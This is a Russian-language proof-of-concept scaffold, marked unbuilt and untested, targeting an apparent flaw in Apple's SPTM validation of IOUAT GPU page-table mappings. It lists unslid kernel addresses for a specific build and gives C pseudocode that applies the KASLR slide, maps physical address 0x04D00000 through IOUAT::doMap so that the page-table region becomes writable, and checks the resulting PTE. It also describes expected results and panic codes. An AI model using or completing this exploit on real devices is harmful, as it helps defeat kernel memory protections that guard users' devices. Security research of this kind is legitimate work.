# SPTM PoC scaffold (dev/kext only)

> **Не собрано и не проверено.** Это скелет для dev-устройства с kernel-кодом
> (kext / jailbreak helper). Он не является IPA и не запускается из песочницы.
> Вызов `doMap` может паниковать; используй только тестовое устройство.

## Что проверяем

`SPTM UAT MAP_CONTINUE` (`0xfffffff0270adf30`) при
`paddr == uat_instance->gpu_region_base` и не-special типе **не вызывает**
`sptm_validate_fte` и всё равно пишет PTE. Если подать в UAT сегмент с
`paddr = 0x04D00000`, TTBAT становится writable.

## Предусловия

- kernel slide известен;
- firmware IOUAT инициализирован (GPU работает);
- есть kernel-контекст, откуда можно вызвать IOUAT/`doMap`;
- тестовое устройство, не daily driver.

## Адреса (unslid, 24B115)

```
IOUAT global             0xfffffff00add7728   // *(u64*) -> IOUAT object
IOUAT::doMap             0xfffffff00a9ee318
IOUAT::getPageTableEntry 0xfffffff00a9ec9d0
IOUAT::getPageTableBase  0xfffffff00a9ecb48
IOUAT::setClientContextID 0xfffffff00a9ee0d0
IOUAT::removeClientContextID 0xfffffff00a9ee210
IOMemoryDescriptor::withPhysicalAddress 0xfffffff00a97af54
SPTM MAP_BEGIN           0xfffffff0270ae700
SPTM MAP_CONTINUE        0xfffffff0270adf30
SPTM validate_fte        0xfffffff0270e1168
uat_instance ptr         0xfffffff0270921b8
gpu_region_base          uat_instance + 0x68
```

## Псевдокод

```c
uint64_t slide = ...;                         // KASLR slide
#define K(x) ((uint64_t)(x) + slide)

uint64_t iouat = *(volatile uint64_t *)K(0xfffffff00add7728);
if (!iouat) { IOLog("IOUAT not initialized\n"); return; }

IOMemoryDescriptor *desc =
    IOMemoryDescriptor::withPhysicalAddress(0x04D00000, 0x20000, kIODirectionInOut);
if (!desc) { IOLog("descriptor failed\n"); return; }

typedef kern_return_t (*doMap_t)(void *, IOMemoryDescriptor *, uint64_t, uint64_t, uint64_t);
doMap_t doMap = (doMap_t)K(0xfffffff00a9ee318);

uint64_t va = 0x100000000ULL;                 // 16K-aligned GPU VA
kern_return_t kr = doMap((void *)iouat, desc, va, 0x20000, 0);
IOLog("doMap -> 0x%x\n", kr);

typedef uint64_t (*getPTE_t)(void *, uint64_t);
getPTE_t getPTE = (getPTE_t)K(0xfffffff00a9ec9d0);
uint64_t pte = getPTE((void *)iouat, va);
IOLog("PTE(0x%llx) = 0x%016llx\n", va, pte);
```

## Что должно получиться

- `doMap` возвращает 0;
- нет паники `0x4000012`;
- `getPTE(va)` содержит `paddr = 0x04D00000` и writable-биты;
- `getPageTablePhysicalBaseAddress(0)` отдаёт root table paddr.

Если `doMap` паникует `0x4000012` — тип маппинга special; если паникует
иначе — неверный IOUAT object/state/context.

## Ограничения

- `iouat` может требовать `setClientContextID` перед `doMap`;
- `va` должен быть свободен в UAT;
- `getPageTableEntry` использует PPL ioctl `0xbee5`;
- это не sandbox escape: kext уже в kernel-контексте.
